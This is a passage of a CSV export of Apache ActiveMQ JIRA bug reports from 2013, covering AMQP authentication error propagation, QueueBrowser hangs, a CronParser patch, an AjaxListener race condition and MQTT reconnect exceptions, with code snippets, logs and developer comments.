;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
AMQP: JMSSecurityExceptions are not propagated back to QPID client on authentication failures,AMQ-4596,12654475,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,kearls,kearls,24/Jun/13 11:47,04/Sep/13 14:27,14/Jul/23 05:43,04/Sep/13 14:27,,,,,,5.9.0,,,Broker,,,,0,,,,,,,,,"I created a broker using a config file that contained:

<simpleAuthenticationPlugin>
    <users>
        <authenticationUser username=""system"" password=""systemPassword"" groups=""users,admins""/>
       <authenticationUser username=""user"" password=""userPassword"" groups=""users""/>
       <authenticationUser username=""guest"" password=""guestPassword"" groups=""guests""/>
    </users>
</simpleAuthenticationPlugin>

With a normal client, the following code will throw a JMSSecurityException on the connection.start(), or connection.createProducer(), or I assume on anything you do with connection.  The same is true if I call createConnection with an unknown user, or a known user and invalid password

    ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(""vm://localhost"");
    Connection connection = factory.createConnection();
    connection.start();

When I use the QPID client though, I don't get the JMSSecurityException.  In the logs I can see the exception being thrown by the broker, but it doesn't get propagated back to the client, even if I add an exception listener.  The code below will continue along until it hangs on the session.CreateProducer() call.

    ConnectionFactoryImpl factory = new ConnectionFactoryImpl(""localhost"", port, ""admin"", ""password"");
     Connection connection = factory.createConnection();
     connection.setExceptionListener(new ExceptionListener() {
         @Override
         public void onException(JMSException exception) {
             exception.printStackTrace();
         }
     });
     Session session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);
     QueueImpl queue = new QueueImpl(""queue://txqueue"");
     MessageProducer p = session.createProducer(queue);

I will attach a unit test that reproduces this.

",,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Aug/13 16:48;kearls;AMQ-4596-partial.patch;https://issues.apache.org/jira/secure/attachment/12600199/AMQ-4596-partial.patch","24/Jun/13 11:50;kearls;AMQ-4596.patch;https://issues.apache.org/jira/secure/attachment/12589391/AMQ-4596.patch","02/Sep/13 08:46;kearls;AMQ-4596_final.patch;https://issues.apache.org/jira/secure/attachment/12601039/AMQ-4596_final.patch","04/Sep/13 08:25;kearls;AMQ-4596_final_fixed.patch;https://issues.apache.org/jira/secure/attachment/12601331/AMQ-4596_final_fixed.patch","28/Aug/13 07:01;kearls;AMQ-4596_updated.patch;https://issues.apache.org/jira/secure/attachment/12600343/AMQ-4596_updated.patch",,,,,,,,,,,,,,,,,5.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,334752,,,Wed Sep 04 14:27:22 UTC 2013,,,,,,,,,,,"0|i1lqt3:",335078,,,,,,,,,,,,,,,,,,,,,"24/Jun/13 11:50;kearls;Unit test that reproduces the problem.
;;;","08/Jul/13 19:40;tabish;The trick is figuring out how to return the exception to the amqp client, currently its not obvious how that's supposed to work.  ;;;","26/Aug/13 08:41;kearls;We need to update to version 0.5 of proton in order to fix this.  Then we can call setCondition on the proton connection to send the error back to the client.
 ;;;","27/Aug/13 16:48;kearls;This patch should fix this issue in proton 0.5 (or 1.0-SNAPSHOT), although it causes the AMQ-4563Test to fail.
;;;","27/Aug/13 19:43;tabish;For me if I add in this code to the onActiveMQCommand's handling of MessageDispatch commands then everything seems to work.

{code}
                if (md.getMessage() != null) {
                    Message message = md.getMessage();
                    if (!message.getProperties().containsKey(""JMS_AMQP_MESSAGE_FORMAT"")) {
                        message.setProperty(""JMS_AMQP_MESSAGE_FORMAT"", 0);
                    }
                }
{code}

I couldn't really find anything that informs on the values this property should have but from the code it appears that zero is the not set fall-back so it might be safe enough. ;;;","28/Aug/13 07:01;kearls;This patch contains Tim's suggested change, plus a couple of other minor updates.  The constructors we were using for protonConnection (ConnectionImpl) and protonTransport (TransportImpl) have both been deprecated so I updated those definitions.
;;;","28/Aug/13 13:06;tabish;Not quite sure at this point what the right patches are since I get some conflicts on the third one, can you make on big rollup patch or clue me in on what I should be applying?;;;","28/Aug/13 14:52;kearls;Sorry, I'll get it straightened out either this evening or tomorrow morning and upload a single patch.
;;;","02/Sep/13 08:46;kearls;Tim, this patch should work correctly.  Please note a couple of things:

1. This includes the code change for AMQ4696, so you should probably apply that first, or ask me for another update.
2. Besides the changes for this bug (which occurs at line 405) there are several other changes for things that were either deprecated in or removed from proton-jms 0.5
;;;","03/Sep/13 20:53;tabish;Not sure what I'm doing wrong but after applying AMQ-4696 and then trying to apply this one I get a bunch of errors trying to compile. Things like AmqpTransport not defined etc.;;;","04/Sep/13 08:24;kearls;Sorry, that's bizarre.  I recreated it, and tested it on a freshly checkedout version of the code.  If you still have problems please ping me.
;;;","04/Sep/13 14:27;tabish;Patch applied cleanly this time, tests look good. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
QueueBrowser hangs when browsing large queues,AMQ-4595,12654150,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,tabish,ravv,ravv,21/Jun/13 13:53,01/Sep/14 16:17,14/Jul/23 05:43,15/Jul/13 14:22,5.8.0,,,,,5.9.0,,,Broker,,,,0,QueueBrowser,,,,,,,,"When trying to browse a queue with a QueueBrowser, the browsing will hang and never complete. This appears to happen only with ""a lot"" of message in the queue. 1000 messages works correctly, but 10000 hangs.

I have attached a unit test that exhibits the problem. Change the ""messageToSend"" variable in the test method to see the difference between small queue size and large queue size. 

I've attached the unit test code as well as the output from one of the runs with 10000 messages. ",All,cwikman,ravv,richardfearn,tabish,tmielke,tom_m,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4487,AMQ-5340,,,,,,,,,,,,"11/Jul/13 18:19;tabish;AMQ4595Test.java;https://issues.apache.org/jira/secure/attachment/12591883/AMQ4595Test.java","21/Jun/13 13:56;ravv;AMQ580BrowsingBug.java;https://issues.apache.org/jira/secure/attachment/12589064/AMQ580BrowsingBug.java","21/Jun/13 13:59;ravv;amq-test-20130621T155120.log;https://issues.apache.org/jira/secure/attachment/12589067/amq-test-20130621T155120.log",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,334427,,,Tue Oct 01 07:10:31 UTC 2013,,,,,,,,,,,"0|i1lotz:",334753,,,,,,,,,,,,,,,,,,,,,"21/Jun/13 13:56;ravv;Unit test code and output from a run with 10000 messages.;;;","11/Jul/13 16:24;tabish;For such a large Queue the destination policy needs to be updated to use a larger maxAuditDepth to avoid spinning as the audit rolls over. ;;;","11/Jul/13 18:19;tabish;Updated test case showing how to make this work on a 5.9 SNAPSHOT.;;;","11/Jul/13 18:22;tabish;Since the Queue depth exceeds the maxAuditDepth on the Queue the browse runs into the problem similar to AMQ-4487 which can be resolved by setting maxAuditDepth to some higher value.  Then you must also take into account that the browse will end when the memory limit is reached so you would need to configure a very large limit for this test case to get all 10,000 messages since they have a larger payload.  The updated test case shows how its done. ;;;","12/Jul/13 08:12;tmielke;Hi Tim,

Do you mind explaining a bit more why maxAuditDepth needs to be raised in order to browse a higher number of messages? 
Also, I barely found any documentation on this property. Can we get it added to http://activemq.apache.org/per-destination-policies.html? 

Would the current behavior (when not setting maxAuditDepth) not rather be a bug? From a client's point of view should a queue browser not be used like an ordinary consumer and not require any broker side config changes? 
I am concerned that no ActiveMQ user will think of raising maxAuditDepth in order to browse more than the default 400 messages. This does not seem intuitive.

And finally I want to add that you also need to use version 5.9-SNAPSHOT as even the updated test case does not work with 5.8.0. I presume due to the fix that went in for AMQ-4487?
;;;","12/Jul/13 15:38;tabish;The current behavior is definitely still a bug, however there are ways to work around it.  I'm pretty sure you could get around it by setting a lower memory limit in 5.8 so it doesn't page in so many messages but I didn't try that.  The fix in AMQ-4487 allows the audit settings to be set in the destination policy, previously they were being ignored. 

The problem is that the Message Audit that's don't to prevent the messages that are redispatched when not acked by a closed consumer from getting dropped into a browser a second time since they are read from the pending dispatch message list.  Since this list can grow quite long in this test case it exceeds the audit depth so we get into a loop since the messages in the list don't appear to be duplicates.  Its a flaw in the way Queue Browsers are designed currently.  It wasn't really an issue until we made the change to page in messages for browsers instead of limiting them to a single page.  ;;;","12/Jul/13 19:24;tabish;I think the simplest fix right now short of rewriting the Queue Browser code to have its own message cursor implementation is to just give each QueueBrowserSubscription it's own unbounded duplicate tracker so that we just let them browse until MemoryUsage limits are reached.  ;;;","15/Jul/13 08:10;ravv;We make extensive use of the QueueBrowser in our application (our app is similar to the activemq web console app where you can view all queues, connections, messages; and move messages between any 2 queues). So having a solution that does not require us to change a queue's configuration is important as we don't know queue names, message size or queue size before hand. 

I'm not all that familiar with the internals of AMQ, but in the old AMQ 4.0 series (we're upgrading from that series, btw), we would not have memory issues unless you browsed a *very* large queue (100000s messages). Upgrading the Queue Browser code would also benefit the activemq web console app, as anyone using that will also be bitten by this bug.
;;;","15/Jul/13 14:22;tabish;Fixed on trunk, the QueueBrowser will just track all message Audits since its a transient subscription the overhead will be short lived. ;;;","06/Aug/13 15:44;ravv;I verified that this works in the latest 5.9-SNAPSHOT.

@Torsten - I don't have rights to comment on support cases at RH anymore since my subscription expired. You can close the support ticket there too.
;;;","07/Aug/13 07:13;tmielke;@Nicholas - Thx for the update. Will do.;;;","01/Oct/13 07:10;cwikman;We are using 5.8.0 in production and got hit very hard by this bug and AMQ-4487. 

Does any anyone have a patched 5.8.0 with this fixed? Or is there any other workaround? ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MySQL 5.1.25 change driver name,AMQ-4592,12653950,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,20/Jun/13 15:15,20/Jun/13 15:19,14/Jul/23 05:43,20/Jun/13 15:19,5.8.0,,,,,5.9.0,,,,,,,0,,,,,,,,,"It's changed to ""MySQL Connector Java""

http://dev.mysql.com/doc/relnotes/connector-j/en/news-5-1-25.html

We need to support this name in adapter selection

",,dejanb,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,334227,,,Thu Jun 20 15:19:23 UTC 2013,,,,,,,,,,,"0|i1lnlj:",334553,,,,,,,,,,,,,,,,,,,,,"20/Jun/13 15:19;dejanb;Fixed with svn revision 1495049;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"CronParser bug on getNextScheduledTime to handle the once per minute case ""* * * * *""",AMQ-4591,12653876,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,ralfaro,ralfaro,20/Jun/13 07:08,08/Jul/13 14:22,14/Jul/23 05:43,08/Jul/13 14:22,5.8.0,5.9.0,,,,5.9.0,,,Broker,,,,0,patch,,,,,,,,"There is a Bug on handle the once per minute case.
For the cronentry: ""* * * * *"" 
The Next Scheduled time is not the top of the next minute.
Instead, is the current Time plus 60 seconds

The problem is that the code is trying to set the precision at seconds, but the precision must have to be at minutes. 

You can check the patch attached to see the change required to fix this issue.",Any,ralfaro,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,3600,3600,,0%,3600,3600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"20/Jun/13 07:09;ralfaro;CronParser.java.patch;https://issues.apache.org/jira/secure/attachment/12588773/CronParser.java.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,334153,,,Mon Jul 08 14:22:04 UTC 2013,,,,,,,Patch Available,,,,"0|i1ln53:",334479,,,,,,,,,,,,,,,,,,,,,"20/Jun/13 07:09;ralfaro;Patch to handle the cronEntry ""* * * * *"";;;","05/Jul/13 13:28;tabish;Can you link to appropriate documentation that states that the intended behavior of the ""* * * * *"" entry is current time + 60 seconds instead of the top of every minute. ;;;","07/Jul/13 18:55;ralfaro;No, what I tried to mean, is that the current behaviour with the current code on SVN is that the next schedule time is the current time + 60 seconds for the pattern ""* * * * *"".
But the correct behaviour, must have to be, to calculate the top of the next minute.

If you look at the code:
https://svn.apache.org/repos/asf/activemq/trunk/activemq-client/src/main/java/org/apache/activemq/broker/scheduler/CronParser.java

The issue is at the line 47:

            result = result / 1000 * 1000;
 
the previous formula, sets the precision to ""seconds"", so, if the current time is 00:01:40, de next scheduled time will be 00:02:40
That is not correct, because the next scheduled time must have to be the top of the next minute.
So, to calculate the top of the next minute, the previous formula must have to be:

            result = result / 60000 * 60000;



That is the why I proposed to following patch:


Index: activemq-client/src/main/java/org/apache/activemq/broker/scheduler/CronParser.java
===================================================================
--- activemq-client/src/main/java/org/apache/activemq/broker/scheduler/CronParser.java	(revision 1494862)
+++ activemq-client/src/main/java/org/apache/activemq/broker/scheduler/CronParser.java	(working copy)
@@ -44,7 +44,7 @@
         // starting the next event at the top of the minute.
         if (cronEntry.equals(""* * * * *"")) {
             result = currentTime + 60 * 1000;
-            result = result / 1000 * 1000;
+            result = result / 60000 * 60000;
             return result;
         }
 
;;;","08/Jul/13 14:22;tabish;Fixed on trunk, thanks for the patch. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Race condition in AjaxListener causes lost messages,AMQ-4589,12653686,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,themel,themel,19/Jun/13 10:54,19/Jun/13 16:32,14/Jul/23 05:43,19/Jun/13 16:32,5.8.0,,,,,5.9.0,,,,,,,1,,,,,,,,,"Running activemq-web under a container that supports Servlet 3, there is a race condition when resuming continuations that leads to lost messages because the same continuation is resumed multiple times and the second time around the undelivered_message attribute is overwritten. 

Here's an example debug log of the issue under Jetty:

{noformat}
2013-06-19 10:46:51,340 DEBUG o.a.a.web.MessageListenerServlet   - doMessage timeout=25000
2013-06-19 10:46:51,350 DEBUG o.a.a.web.MessageListenerServlet   - received null from ActiveMQMessageConsumer { value=ID:deapp0313-52345-1371228095770-3:126:1:1, started=true }
2013-06-19 10:46:51,350 DEBUG o.a.a.web.MessageListenerServlet   - Suspending continuation org.eclipse.jetty.continuation.Servlet3Continuation@73d4a75a
2013-06-19 10:46:53,053 DEBUG org.apache.activemq.web.AjaxListener   - message is ActiveMQTextMessage {commandId = 4419, responseRequired = true, messageId = ID:deapp0313-52345-1371228095770-1:1:1:1:4415, originalDestination = null, originalTransactionId = null, producerId = ID:deapp0313-52345-1371228095770-1:1:1:1, destination = topic://W2ETopic, transactionId = null, expiration = 0, timestamp = 1371631612606, arrival = 0, brokerInTime = 1371631612628, brokerOutTime = 1371631612629, correlationId = null, replyTo = null, persistent = true, type = null, priority = 4, groupID = null, groupSequence = 0, targetConsumerId = null, compressed = false, userID = null, content = null, marshalledProperties = org.apache.activemq.util.ByteSequence@1e5bc429, dataStructure = null, redeliveryCounter = 0, size = 0, properties = {instance=1796}, readOnlyProperties = true, readOnlyBody = true, droppable = false, text = {""instance"":{""instanceId"":1796,""changeNo"":217...nput"":true}}}
2013-06-19 10:46:53,062 DEBUG org.apache.activemq.web.AjaxListener   - Resuming suspended continuation org.eclipse.jetty.continuation.Servlet3Continuation@73d4a75a
2013-06-19 10:46:53,063 DEBUG org.apache.activemq.web.AjaxListener   - message for ActiveMQMessageConsumer { value=ID:deapp0313-52345-1371228095770-3:126:1:1, started=true } continuation=org.eclipse.jetty.continuation.Servlet3Continuation@73d4a75a
2013-06-19 10:46:53,064 DEBUG org.apache.activemq.web.AjaxListener   - message is ActiveMQTextMessage {commandId = 4420, responseRequired = true, messageId = ID:deapp0313-52345-1371228095770-1:1:1:1:4416, originalDestination = null, originalTransactionId = null, producerId = ID:deapp0313-52345-1371228095770-1:1:1:1, destination = topic://W2ETopic, transactionId = null, expiration = 0, timestamp = 1371631612644, arrival = 0, brokerInTime = 1371631612644, brokerOutTime = 1371631613022, correlationId = null, replyTo = null, persistent = true, type = null, priority = 4, groupID = null, groupSequence = 0, targetConsumerId = null, compressed = false, userID = null, content = null, marshalledProperties = org.apache.activemq.util.ByteSequence@1aab6f51, dataStructure = null, redeliveryCounter = 0, size = 0, properties = {instance=1796}, readOnlyProperties = true, readOnlyBody = true, droppable = false, text = {""instance"":{""instanceId"":1796,""changeNo"":217...nput"":true}}}
2013-06-19 10:46:53,064 DEBUG org.apache.activemq.web.AjaxListener   - Resuming suspended continuation org.eclipse.jetty.continuation.Servlet3Continuation@73d4a75a
2013-06-19 10:46:53,065 DEBUG o.a.a.web.MessageListenerServlet   - GET client=org.apache.activemq.web.AjaxWebClient@7c00281 session=c5qseeifcc9l1n49e7ivdx3at clientId=w2e-gui-0.18586184200830758 uri=/amq query=timeout=120000&d=1371631611528&r=0.4084213834721595&clientId=w2e-gui-0.18586184200830758
2013-06-19 10:46:53,065 DEBUG o.a.a.web.MessageListenerServlet   - doMessage timeout=25000
2013-06-19 10:46:53,065 DEBUG o.a.a.web.MessageListenerServlet   - sending pre-existing message
2013-06-19 10:46:53,066 DEBUG o.a.a.web.MessageListenerServlet   - Send 0 unconsumed messages
2013-06-19 10:46:53,065 ERROR org.apache.activemq.web.AjaxListener   - Error receiving message java.lang.IllegalStateException: REDISPATCHED,resumed
java.lang.IllegalStateException: REDISPATCHED,resumed
	at org.eclipse.jetty.server.HttpChannelState.dispatch(HttpChannelState.java:335) ~[jetty-server-9.0.3.v20130506.jar:9.0.3.v20130506]
	at org.eclipse.jetty.server.AsyncContextState.dispatch(AsyncContextState.java:109) ~[jetty-server-9.0.3.v20130506.jar:9.0.3.v20130506]
	at org.eclipse.jetty.continuation.Servlet3Continuation.resume(Servlet3Continuation.java:186) ~[jetty-continuation-9.0.3.v20130506.jar:9.0.3.v20130506]
	at org.apache.activemq.web.AjaxListener.onMessageAvailable(AjaxListener.java:74) ~[activemq-web-5.8.0.jar:5.8.0]
	at org.apache.activemq.ActiveMQMessageConsumer.dispatch(ActiveMQMessageConsumer.java:1343) [activemq-client-5.8.0.jar:5.8.0]
	at org.apache.activemq.ActiveMQSessionExecutor.dispatch(ActiveMQSessionExecutor.java:131) [activemq-client-5.8.0.jar:5.8.0]
	at org.apache.activemq.ActiveMQSessionExecutor.iterate(ActiveMQSessionExecutor.java:202) [activemq-client-5.8.0.jar:5.8.0]
	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:129) [activemq-client-5.8.0.jar:5.8.0]
	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:47) [activemq-client-5.8.0.jar:5.8.0]
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110) [na:1.7.0_07]
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603) [na:1.7.0_07]
	at java.lang.Thread.run(Thread.java:722) [na:1.7.0_07]
2013-06-19 10:46:53,068 DEBUG o.a.a.web.MessageListenerServlet   - Continuation org.eclipse.jetty.continuation.Servlet3Continuation@73d4a75a completed.
{noformat}

The root of the race is that the code uses isSuspended() to check whether a continuation has been resumed, but resume() only resets isSuspended() after the resume request has been processed in the servlet engine. The race-free way to check whether is has been resumed is to check isResumed(), see attached patch. ","Jetty 9.0.3, Java 7, Windows",tabish,themel,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Jun/13 10:56;themel;AjaxListener-race.diff;https://issues.apache.org/jira/secure/attachment/12588570/AjaxListener-race.diff",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,333963,,,Wed Jun 19 16:32:02 UTC 2013,,,,,,,Patch Available,,,,"0|i1llyv:",334289,,,,,,,,,,,,,,,,,,,,,"19/Jun/13 10:56;themel;Patch against activemq-parent 5.8.0;;;","19/Jun/13 16:32;tabish;Patch applied on trunk for 5.9;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"org.apache.activemq.util.IdGenerator calls non-configurable new ServerSocket(0);",AMQ-4588,12653550,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,bdecoste,bdecoste,18/Jun/13 18:49,09/Jul/13 05:57,14/Jul/23 05:43,08/Jul/13 19:04,5.8.0,,,,,5.9.0,,,JMS client,,,,0,,,,,,,,,"In order to have the AMQ client run on OpenShift the IdGenerator call 'new ServerSocket(0);' needs to be configurable to be avoided. OpenShift only allows binding to a specific, provided, unique loopback address and a limited set of ports. Ideally there would be a configuration option that allows the stub prefix to be set via a JVM param. The current logic doesn't break OpenShift as the PermissionDenied exception is caught and swallowed but the stack trace is ugly.",,bdecoste,davsclaus,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Jul/13 15:56;kearls;AMQ-4588.patch;https://issues.apache.org/jira/secure/attachment/12591223/AMQ-4588.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,333827,,,Tue Jul 09 05:57:25 UTC 2013,,,,,,,,,,,"0|i1ll4v:",334154,,,,,,,,,,,,,,,,,,,,,"19/Jun/13 15:48;tabish;We welcome patches so if you have some idea of what would be the best solution then patch away. ;;;","08/Jul/13 15:56;kearls;Here's a patch that does the following:

- adds JVM parameter activemq.idgenerator.port which can be used to set a port other than 0
- changed the logging to only print the stack trace if trace logging is enabled.

I did not add a test because of the difficulty of properly unit testing things that happen in static initializers and logs.  I manually tested these cases:

- default, activemq.idgenerator.port not set
- activemq.idgenerator.port set to a valid port
- activemq.idgenerator.port set to invalid values, such as 12345678 or foo

I also changed logging levels and checked for proper output in the logs.;;;","08/Jul/13 19:04;tabish;Patch applied with thanks. ;;;","09/Jul/13 05:57;davsclaus;Fixed this in Camel as well: CAMEL-6521;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
AMQP to JMS transformer fails to properly map AMQP specific property types like UnsignedInteger,AMQ-4587,12653530,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,chirino,chirino,chirino,18/Jun/13 17:22,18/Jun/13 17:25,14/Jul/23 05:43,18/Jun/13 17:25,,,,,,5.9.0,,,,,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,333807,,,Tue Jun 18 17:22:36 UTC 2013,,,,,,,,,,,"0|i1ll0n:",334135,,,,,,,,,,,,,,,,,,,,,"18/Jun/13 17:22;chirino;See: PROTON-340;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MQTT BlockingConnection.receive fails when receiving pending messages after reconnect without cleaning session,AMQ-4585,12653240,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,pmarques,pmarques,17/Jun/13 18:16,14/Oct/14 17:15,14/Jul/23 05:43,24/Jun/14 16:29,5.8.0,,,,,5.10.0,,,,,,,0,,,,,,,,,"The system throws at least three different types of exceptions when a subscriber receives the first pending message without cleaning the session. The test case corresponds to receiving several messages from a publisher then closing the subscriber connection and finally reconnecting with setCleanSession(false) and attempt to read the messages published while the subscriber was disconnected.
The exceptions thrown:
{code}
java.net.ProtocolException: Command from server contained an invalid message id: 1
	at org.fusesource.mqtt.client.CallbackConnection.completeRequest(CallbackConnection.java:723)
	at org.fusesource.mqtt.client.CallbackConnection.processFrame(CallbackConnection.java:762)
	at org.fusesource.mqtt.client.CallbackConnection.access$1500(CallbackConnection.java:51)
	at org.fusesource.mqtt.client.CallbackConnection$6.onTransportCommand(CallbackConnection.java:392)
	at org.fusesource.hawtdispatch.transport.TcpTransport.drainInbound(TcpTransport.java:659)
	at org.fusesource.hawtdispatch.transport.SslTransport.drainInbound(SslTransport.java:264)
	at org.fusesource.hawtdispatch.transport.TcpTransport$6.run(TcpTransport.java:538)
	at org.fusesource.hawtdispatch.internal.NioDispatchSource$3.run(NioDispatchSource.java:209)
	at org.fusesource.hawtdispatch.internal.SerialDispatchQueue.run(SerialDispatchQueue.java:100)
	at org.fusesource.hawtdispatch.internal.pool.SimpleThread.run(SimpleThread.java:77)
{code}
{code}
java.lang.ArrayIndexOutOfBoundsException: 0
	at org.fusesource.mqtt.codec.MessageSupport$AckBase.decode(MessageSupport.java:81)
	at org.fusesource.mqtt.codec.PUBREC.decode(PUBREC.java:40)
	at org.fusesource.mqtt.client.CallbackConnection.processFrame(CallbackConnection.java:749)
	at org.fusesource.mqtt.client.CallbackConnection.access$1500(CallbackConnection.java:51)
	at org.fusesource.mqtt.client.CallbackConnection$6.onTransportCommand(CallbackConnection.java:392)
	at org.fusesource.hawtdispatch.transport.TcpTransport.drainInbound(TcpTransport.java:659)
	at org.fusesource.hawtdispatch.transport.SslTransport.drainInbound(SslTransport.java:264)
	at org.fusesource.hawtdispatch.transport.TcpTransport$6.run(TcpTransport.java:538)
	at org.fusesource.hawtdispatch.internal.NioDispatchSource$3.run(NioDispatchSource.java:209)
	at org.fusesource.hawtdispatch.internal.SerialDispatchQueue.run(SerialDispatchQueue.java:100)
	at org.fusesource.hawtdispatch.internal.pool.SimpleThread.run(SimpleThread.java:77)
{code}
{code}
java.net.ProtocolException: Unexpected MQTT command type: 0
	at org.fusesource.mqtt.client.CallbackConnection.processFrame(CallbackConnection.java:775)
	at org.fusesource.mqtt.client.CallbackConnection.access$1500(CallbackConnection.java:51)
	at org.fusesource.mqtt.client.CallbackConnection$6.onTransportCommand(CallbackConnection.java:392)
	at org.fusesource.hawtdispatch.transport.TcpTransport.drainInbound(TcpTransport.java:659)
	at org.fusesource.hawtdispatch.transport.SslTransport.drainInbound(SslTransport.java:264)
	at org.fusesource.hawtdispatch.transport.TcpTransport$6.run(TcpTransport.java:538)
	at org.fusesource.hawtdispatch.internal.NioDispatchSource$3.run(NioDispatchSource.java:209)
	at org.fusesource.hawtdispatch.internal.SerialDispatchQueue.run(SerialDispatchQueue.java:100)
	at org.fusesource.hawtdispatch.internal.pool.SimpleThread.run(SimpleThread.java:77)
{code}
